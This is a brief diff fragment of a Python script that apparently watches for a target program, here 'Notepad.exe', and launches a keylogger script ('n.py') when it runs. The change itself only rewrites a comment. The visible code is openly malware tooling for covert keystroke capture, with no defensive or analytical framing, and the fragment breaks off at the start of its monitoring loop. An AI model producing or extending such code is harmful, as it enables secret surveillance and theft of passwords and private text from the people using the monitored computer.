@@ -11,7 +11,7 @@ def is_process_running(process_name):
 def run_keylogger():
     subprocess.Popen(['python', 'n.py'])
 
-# Replace 'target.exe' with the name of your target executable
+# Replace 'Notepad.exe' with the name of your target executable
 target_executable = 'Notepad.exe'
 
 while True:
